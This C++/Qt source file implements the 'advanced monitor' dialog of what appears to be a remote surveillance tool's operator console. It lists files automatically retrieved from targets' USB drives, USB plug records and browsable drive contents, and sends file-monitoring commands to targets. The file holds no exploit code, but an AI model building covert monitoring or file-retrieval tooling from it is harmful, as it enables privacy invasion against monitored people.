#include "advancemonitordlg.h"
#include "DatabaseManager.h"
#include "target.h"
#include "nofocusstyle.h"
#include "include/T5UsbConfig.h"

AdvanceMonitorDlg::AdvanceMonitorDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
{
	ui.setupUi(this);

	// 检测用
	if ( SYSTEM_WINDOWS == GetSystemType(this->m_tar->dwOsBuildNumber) )
	{
		ui.trAdvanceFileMonitor->topLevelItem(0)->setHidden(true);
	}

	InitConnection();
	InitWidgetAppearance();
	InitAdvanceMonitor();
}

AdvanceMonitorDlg::~AdvanceMonitorDlg()
{

}

void AdvanceMonitorDlg::InitConnection()
{
	// 点击左侧树形列表
	connect(
		ui.trAdvanceFileMonitor, 
		SIGNAL(itemClicked(QTreeWidgetItem*, int)), 
		this, 
		SLOT(onTrAdvanceFileMonitorItemClicked(QTreeWidgetItem*, int)));

	// 点击 usb 插拔记录列表
	connect(ui.tbUsbPlugRecord, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbUsbPlugRecordItemClicked(QTableWidgetItem*)));

	// 双击 usb 目录
	connect(ui.tbUsbDir, SIGNAL(itemDoubleClicked(QTableWidgetItem*)), this, SLOT(onTbUsbDirItemDoubleClicked(QTableWidgetItem*)));

	// 清除记录
	connect(ui.btnCleanMonitorRecord, SIGNAL(clicked()), this, SLOT(onBtnCleanMonitorRecordClicked()));

	// 取消监控
	connect(ui.btnCancelMonitor, SIGNAL(clicked()), this, SLOT(onBtnCancelMonitorClicked()));
}

void AdvanceMonitorDlg::InitWidgetAppearance()
{
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);
	ui.trAdvanceFileMonitor->setStyle(nofocusStyle);

	// 文件监控列表
	//ui.trFileStatus->setStyle(nofocusStyle);
	ui.trFileStatus->header()->resizeSection(0, 400);
	ui.trFileStatus->header()->resizeSection(1, 80);
	ui.trFileStatus->header()->resizeSection(2, 200);
	ui.trFileStatus->header()->resizeSection(3, 200);

	// usb 文件获取
	ui.tbUsbRetrieve->setStyle(nofocusStyle);
	ui.tbUsbRetrieve->horizontalHeader()->resizeSection(1, 100);
}

void AdvanceMonitorDlg::InitAdvanceMonitor()
{
	// 初始化最近的 usb 文件列表
	DM->QueryUsbFile(this->m_tar->dwTargetID, ui.tbUsbRetrieve);

	// 初始化 usb 操作
	DM->QueryUSBOpData(this->m_tar->dwTargetID, ui.tbUsbPlugRecord);

	ui.trAdvanceFileMonitor->topLevelItem(0)->setExpanded(true);

	if ( MobileDevice(m_tar) )
		ui.trAdvanceFileMonitor->takeTopLevelItem(0);
	if ( SYSTEM_MACOSX == m_tar->m_sysType )
		ui.trAdvanceFileMonitor->takeTopLevelItem(1);


	for ( int i = 0; i < ui.trAdvanceFileMonitor->topLevelItemCount(); ++i )
	{
		ui.trAdvanceFileMonitor->topLevelItem(i)->setExpanded(true);
	}

	DM->QueryFileMonitorList(m_tar->dwTargetID, ui.trFileStatus);
	DM->QueryFileMonitorRecord(m_tar->dwTargetID, ui.trFileStatus);

	onTrAdvanceFileMonitorItemClicked(ui.trAdvanceFileMonitor->topLevelItem(0), 0);
}

void AdvanceMonitorDlg::onTrAdvanceFileMonitorItemClicked(QTreeWidgetItem* item, int column)
{
	std::wstring text = item->text(0).toStdWString();

	std::map<std::wstring, int> indexMap;

	indexMap[L"USB 设备监控"] = 0;
	indexMap[L"自动获取"] = 0;
	indexMap[L"插拔记录"] = 1;
	indexMap[L"文件状态监控"] = 2;
	indexMap[L"监控记录"] = 2;

	ui.stkAdvanceFileMonitor->setCurrentIndex(indexMap[text]);
	ui.lbAdvanceFileMonitor->setText(QString::fromStdWString(text));

}

void AdvanceMonitorDlg::onTbUsbPlugRecordItemClicked(QTableWidgetItem* item)
{
	QTableWidgetItem* time = ui.tbUsbPlugRecord->item(item->row(), 0);
	//QTableWidgetItem* path = ui.tbUsbPlugRecord->item(item->row(), 1);

	std::wstring curDirTime = time->text().toStdWString();

	std::wstring wPath;

	wPath = time->data(Qt::UserRole).toString().toStdWString();

	FileListViewClear(ui.tbUsbDir);
	UpdateUsbDirInformation(curDirTime, wPath);
}

void AdvanceMonitorDlg::onTbUsbDirItemDoubleClicked(QTableWidgetItem* item)
{
	item = ui.tbUsbDir->item(item->row(), 0);

	// 上一级
	if ( item->text().toStdWString() == L"上一层目录" )
	{
		LocateParentUsbDir();
		return;
	}

	QTableWidgetItem* selectPlugItem = ui.tbUsbPlugRecord->selectedItems()[0];
	QTableWidgetItem* dirTimeItem = ui.tbUsbPlugRecord->item(selectPlugItem->row(), 0);

	PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();
	if (fileBlock)
	{
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			std::wstring curDirTime = dirTimeItem->text().toStdWString();
			std::wstring filePath;
			if ( UnixLike(m_tar) )
			{
				filePath = PathMergeMac(curUsbFilePathW, item->text().toStdWString());
			}
			else
			{
				filePath = PathMergeW(curUsbFilePathW, item->text().toStdWString());
			}

			FileListViewClear(ui.tbUsbDir);
			UpdateUsbDirInformation(curDirTime, filePath);
			AddUpLink();
		}
	}
}

void AdvanceMonitorDlg::onBtnCleanMonitorRecordClicked()
{
	QList<QTreeWidgetItem*> items = ui.trFileStatus->selectedItems();

	if ( 0 == items.count() 
		|| items[0]->parent() != NULL )
	{
		QMessageBox::information(
			this, 
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个文件夹"));
		return;
	}

	std::wstring recordPath = items[0]->text(0).toStdWString();
	DM->CleanFileMonitorRecord(m_tar->dwTargetID, recordPath);

	while ( items[0]->childCount() != 0 )
		items[0]->takeChild(0);
}

void AdvanceMonitorDlg::onBtnCancelMonitorClicked()
{
	QList<QTreeWidgetItem*> items = ui.trFileStatus->selectedItems();

	if ( 0 == items.count() 
		|| items[0]->parent() != NULL )
	{
		QMessageBox::information(
			this, 
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("请选择一个文件夹"));
		return;
	}

	std::wstring path = items[0]->text(0).toStdWString();

	FrmMain->ctrConn->Send_FMT(m_tar->dwTargetID, path, 0, L"*.*");
}

void AdvanceMonitorDlg::AddUpLink()
{
	ui.tbUsbDir->insertRow(0);

	QTableWidgetItem* item = new QTableWidgetItem;
	item->setText(QString::fromLocal8Bit("上一层目录"));
	item->setIcon(QIcon(QPixmap(":/image/uploadfile.png")));

	ui.tbUsbDir->setItem(0, 0, item);

	for ( int i = 1; i <= 4; ++i )
	{
		QTableWidgetItem* dump = new QTableWidgetItem;
		ui.tbUsbDir->setItem(0, i, dump);
	}
}

void AdvanceMonitorDlg::LocateParentUsbDir()
{
	if ( 0 == ui.tbUsbPlugRecord->selectedItems().count() )
		return;

	QTableWidgetItem* selectPlugItem = ui.tbUsbPlugRecord->selectedItems()[0];
	QTableWidgetItem* dirTimeItem = ui.tbUsbPlugRecord->item(selectPlugItem->row(), 0);

	std::wstring wpath = this->curUsbFilePathW.c_str();
	unsigned int pos;

	if ( UnixLike(m_tar) )
	{
		pos = wpath.rfind(L"/");
	}
	else
	{
		pos = wpath.rfind(L"\\");
	}

	if (std::wstring::npos == pos)
	{
		return;
	}

	if (pos == wpath.size() - 1)
	{
		if ( UnixLike(m_tar) )
		{
			pos = wpath.rfind(L"/", wpath.size() - 2);
		}
		else
		{
			pos = wpath.rfind(L"\\", wpath.size() - 2);
		}

		if (std::wstring::npos == pos)
		{            
			return;
		}
	}

	wpath = wpath.substr(0, pos);

	if ( wpath.length() == 2 && !UnixLike(m_tar) )
	{
		wpath += L"\\"; 
	}

	if ( wpath == L"/Volumes" )
	{
		return;
	}

	FileListViewClear(ui.tbUsbDir);

	UpdateUsbDirInformation(dirTimeItem->text().toStdWString(), wpath.c_str());

	std::wstring parent = wpath.substr(0, wpath.rfind(L'/'));
	if ( wpath.length() != 3 && parent != L"/Volumes" )
		AddUpLink();
}

void AdvanceMonitorDlg::UpdateUsbDirInformation(std::wstring curDirTime, std::wstring filePath)
{

	std::string base64Path = GetBase64FromWide(filePath);
	std::string dirData;
	int nCount = DM->QueryUsbDir(this->m_tar->dwTargetID, WideToAnsi(curDirTime), base64Path, dirData);

	if (nCount == 0)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("提示"),
			QString::fromLocal8Bit("数据库中没有该U盘目录或该目录为空目录"));
		return ;
	}

	int nDirIndex = 0;
	FILETIME    local;
	std::vector<struct _FILE_BLOCK *> dirVect;
	std::string dirInfo = dirData.c_str();
	dirVect  = SplitDirString(dirInfo, "|", "*");

	std::vector<PFILE_BLOCK>::iterator i = dirVect.begin();
	for (; i != dirVect.end(); i++)
	{
		PFILE_BLOCK fileBlock = (*i);

		if ((0 == wcscmp(fileBlock->widName.c_str(), L".")) )
		{
			continue;
		}

		fileBlock->widPath = PathMergeW(filePath, fileBlock->widName);

		int row = 0;

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			// 目录放在前面
			row = nDirIndex++;
			ui.tbUsbDir->insertRow(row);
		}
		else
		{
			row = ui.tbUsbDir->rowCount();
			ui.tbUsbDir->insertRow(row);
		}

		// 文件名
		QTableWidgetItem* caption = new QTableWidgetItem(QString::fromStdWString(fileBlock->widName));

		if ( (0 == wcscmp(fileBlock->widName.c_str(), L"..")) )
			caption->setText(QString::fromLocal8Bit("上一层目录"));

		caption->setData(Qt::UserRole, (unsigned int)fileBlock);

		// 修改日期
		QTableWidgetItem* lastWriteTime = new QTableWidgetItem;

		// 类型
		QTableWidgetItem* type = new QTableWidgetItem;

		// 大小
		QTableWidgetItem* size = new QTableWidgetItem;
		size->setTextAlignment(Qt::AlignRight);

		// 属性
		QTableWidgetItem* attribute = new QTableWidgetItem;
		attribute->setTextAlignment(Qt::AlignRight);

		// Get the corresponding icon for ext
		//

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			size->setText("");
			type->setText(QString::fromLocal8Bit("文件夹"));

			QFileIconProvider provider;
			caption->setIcon(provider.icon(QFileIconProvider::Folder));
		}
		else
		{
			int filesize = fileBlock->Size/1024;
			if (0 == filesize )
			{
				if (0 != fileBlock->Size)
				{
					filesize = 1;
				}
			}
			size->setText(QString("%1 KB  ").arg(filesize));

			SHFILEINFOW sfi;
			LPCWSTR lpwzExt = wcsrchr(fileBlock->widName.c_str(), L'.');
			if (lpwzExt)
			{
				SHGetFileInfoW(lpwzExt,
					0,    //FILE_ATTRIBUTE_NORMAL,
					&sfi,
					sizeof(sfi),
					SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);
			}
			else
			{
				SHGetFileInfoW(L"asdf",
					0,    //FILE_ATTRIBUTE_NORMAL,
					&sfi,
					sizeof(sfi),
					SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);            
			}

			caption->setIcon(QIcon(QPixmap::fromWinHICON(sfi.hIcon)));  
			type->setText(QString::fromStdWString(std::wstring(sfi.szTypeName)));
			DestroyIcon(sfi.hIcon);
		}

		SYSTEMTIME  systime;
		FILETIME    local;

		FileTimeToLocalFileTime((FILETIME*)&fileBlock->LastWriteTime, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);
		lastWriteTime->setText(QString(time));

		std::string attrs = "";

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_HIDDEN)
			attrs = attrs + "H";
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_SYSTEM)
			attrs = attrs + "S";
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ENCRYPTED)
			attrs = attrs + "E";

		if (!(fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY ))
		{
			if (fileBlock->FileAttributes & FILE_ATTRIBUTE_READONLY)
				attrs = attrs + "R";
			if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ARCHIVE)
				attrs = attrs + "A";
		}

		attribute->setText(attrs.c_str());

		ui.tbUsbDir->setItem(row, 0, caption);
		ui.tbUsbDir->setItem(row, 1, lastWriteTime);
		ui.tbUsbDir->setItem(row, 2, type);
		ui.tbUsbDir->setItem(row, 3, size);
		ui.tbUsbDir->setItem(row, 4, attribute);
	}

	this->curUsbFilePathW = filePath;
}

void AdvanceMonitorDlg::UpdateUsbFile( MSG* msg )
{
	PCHAR   szTime = (PCHAR)msg->wParam;
	PUSB_FILE_DATA lpUsbFileHeader= (PUSB_FILE_DATA)msg->lParam;

	QTableWidgetItem* tarPath = new QTableWidgetItem;
	QTableWidgetItem* size = new QTableWidgetItem;
	QTableWidgetItem* type = new QTableWidgetItem;
	QTableWidgetItem* lastWriteTime = new QTableWidgetItem;
	QTableWidgetItem* retrieveTime = new QTableWidgetItem;

	lastWriteTime->setTextAlignment(Qt::AlignCenter);
	retrieveTime->setTextAlignment(Qt::AlignCenter);

	tarPath->setText(QString::fromStdWString(std::wstring(lpUsbFileHeader->wzUsbFilePath)));
	int filesize = lpUsbFileHeader->dwSizeOfFile/1024;
	if (filesize == 0 && lpUsbFileHeader->dwSizeOfFile != 0)
	{
		filesize = 1;
	}

	size->setText(QString("%1 KB").arg(filesize));

	SHFILEINFOW sfi;
	PWCHAR lpwzExt = wcsrchr(lpUsbFileHeader->wzUsbFilePath, L'.');
	if (lpwzExt)
	{
		SHGetFileInfoW(lpwzExt,
			0,    //FILE_ATTRIBUTE_NORMAL,
			&sfi,
			sizeof(sfi),
			SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);
	}
	else
	{
		SHGetFileInfoW(L"asdf",
			0,    //FILE_ATTRIBUTE_NORMAL,
			&sfi,
			sizeof(sfi),
			SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);
	}

	tarPath->setIcon(QIcon(QPixmap::fromWinHICON(sfi.hIcon)));
	type->setText(QString::fromStdWString(std::wstring(sfi.szTypeName)));
	DestroyIcon(sfi.hIcon);

	PCHAR  szTimeOne = szTime;
	PCHAR  szTimeTwo = szTime + 64;

	lastWriteTime->setText(QString(szTimeOne));
	retrieveTime->setText(QString(szTimeTwo));

	ui.tbUsbRetrieve->insertRow(0);
	ui.tbUsbRetrieve->setItem(0, 0, tarPath);
	ui.tbUsbRetrieve->setItem(0, 1, size);
	ui.tbUsbRetrieve->setItem(0, 2, type);
	ui.tbUsbRetrieve->setItem(0, 3, lastWriteTime);
	ui.tbUsbRetrieve->setItem(0, 4, retrieveTime);

	ui.tbUsbRetrieve->setRowCount(20);
}

void AdvanceMonitorDlg::UpdateUsbOp( MSG* msg )
{
	PCHAR  szTime = (PCHAR)msg->wParam;;
	PCHAR  szTimeOne = szTime;
	PCHAR  szTimeTwo = szTime + 64;
	FLASH_DISK_INFO* lpDiskInfo = (FLASH_DISK_INFO*)msg->lParam;

	QTableWidgetItem* insertTime = new QTableWidgetItem;
	QTableWidgetItem* drive = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* duration = new QTableWidgetItem;

	insertTime->setTextAlignment(Qt::AlignCenter);
	drive->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	duration->setTextAlignment(Qt::AlignCenter);

	insertTime->setText(QString(szTimeOne).replace("/", "-"));
	drive->setText(QString::fromStdWString(std::wstring(lpDiskInfo->wzVolume)).section("/", -1));
	id->setText(QString("%1").arg(lpDiskInfo->dwFlashDiskId));

	QDateTime start = QDateTime::fromString(szTimeOne, QString("yyyy-MM-dd hh:mm:ss"));
	QDateTime end = QDateTime::fromString(szTimeTwo, QString("yyyy-MM-dd hh:mm:ss"));
	int timebetween = end.toTime_t() - start.toTime_t();
	duration->setText(QString("%1").arg(timebetween));

	insertTime->setData(Qt::UserRole, QString::fromStdWString(std::wstring(lpDiskInfo->wzVolume)));

	ui.tbUsbPlugRecord->insertRow(0);

	ui.tbUsbPlugRecord->setItem(0, 0, insertTime);
	ui.tbUsbPlugRecord->setItem(0, 1, drive);
	ui.tbUsbPlugRecord->setItem(0, 2, id);
	ui.tbUsbPlugRecord->setItem(0, 3, duration);
}

void AdvanceMonitorDlg::AddMonitorItem( const std::wstring& path )
{
	QTreeWidgetItem* item = new QTreeWidgetItem;
	item->setText(0, QString::fromStdWString(path));
	QFileIconProvider provider;
	item->setIcon(0, provider.icon(QFileIconProvider::Folder));
	ui.trFileStatus->addTopLevelItem(item);
}

void AdvanceMonitorDlg::RemoveMonitorItem(const std::wstring& path)
{
	QTreeWidgetItem* item = GetParentDirItem(ui.trFileStatus, path);

	if ( item )
		ui.trFileStatus->takeTopLevelItem(ui.trFileStatus->indexOfTopLevelItem(item));
}

void AdvanceMonitorDlg::MonitorFileChanged( MSG* msg )
{
	std::wstring path = (LPCWSTR)msg->wParam;
	PCHG_INFO pChgInfo = (PCHG_INFO)msg->lParam;

	QTreeWidgetItem* item = GetParentDirItem(ui.trFileStatus, path);

	QTreeWidgetItem* newRecord = new QTreeWidgetItem;
	newRecord->setText(0, QString::fromStdWString(path));
	newRecord->setIcon(0, QIcon(
		QPixmap::fromWinHICON(GetIconFromFileName(path.c_str()))
		));

	if ( item )
	{
		item->setText(1, QString::fromStdWString(GetTimeFromLongLong(pChgInfo->dwTime)));
		newRecord->setText(2, QString::fromStdWString(pChgInfo->remark));
		newRecord->setText(1, QString::fromStdWString(GetTimeFromLongLong(pChgInfo->dwTime)));
		item->insertChild(0, newRecord);
	}
}
